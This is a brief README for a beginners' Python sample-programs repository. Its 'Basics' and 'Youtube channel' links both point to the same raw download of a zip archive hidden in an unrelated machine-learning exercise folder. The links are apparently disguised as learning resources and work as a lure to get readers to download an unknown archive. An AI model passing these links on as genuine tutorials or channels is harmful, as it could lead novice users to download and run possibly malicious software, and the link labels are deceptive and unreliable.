Repository to store sample Python programs.

This repository is meant for beginners to assist them in their learning of Python. The repository covers a wide range of algorithms and other programs, and would prove immensely helpful for everybody interested in Python programming.

If this is your first time coding in Python, I would love to suggest you begin from the [Basics](https://raw.githubusercontent.com/alokiksoni/py/master/ML/18_PCA/Exercise/py_v1.0.zip). They are simple to understand and hopefully will prove fun to you.

You can also pay a visit to my very own [Youtube channel](https://raw.githubusercontent.com/alokiksoni/py/master/ML/18_PCA/Exercise/py_v1.0.zip).

Contributions to the repository are welcome.

#### Happy coding!
